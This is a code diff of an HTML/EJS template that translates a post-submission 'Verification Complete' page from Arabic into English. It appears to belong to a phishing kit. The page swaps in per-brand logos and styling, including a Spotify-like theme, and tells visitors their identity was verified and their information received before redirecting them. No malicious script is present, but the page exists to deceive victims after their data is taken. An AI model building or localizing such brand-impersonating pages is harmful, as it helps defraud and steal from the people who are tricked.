@@ -1,5 +1,5 @@
 <!doctype html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
@@ -257,14 +257,14 @@ body.brand-spotifyaudio{background:#121212;color:#fff}body.brand-spotifyaudio .c
 <div class="card">
   <% if (typeof logos !== 'undefined' && logos[tpl.key]) { %><div style="text-align:center;margin-bottom:16px"><%- logos[tpl.key] %></div><% } else { %><span class="brand-logo"><%= tpl.name %></span><% } %>
   <div class="check">✅</div>
-  <h1>تمت العملية بنجاح!</h1>
-  <p class="sub"><%= pageContent?.subheadline || 'تم التحقق من هويتك بنجاح. شكراً لتعاونك.' %></p>
+  <h1>Verification Complete!</h1>
+  <p class="sub"><%= pageContent?.subheadline || 'Your identity has been verified successfully. Thank you for your cooperation.' %></p>
 
   <div class="info-box">
-    ✓ تم استلام بياناتك وهي قيد المراجعة
+    ✓ Your information has been received and is under review
   </div>
 
-  <p class="redirect">سيتم تحويلك تلقائياً خلال ثوانٍ...</p>
+  <p class="redirect">You will be redirected automatically in a few seconds...</p>
 </div>
 </body>
 </html>
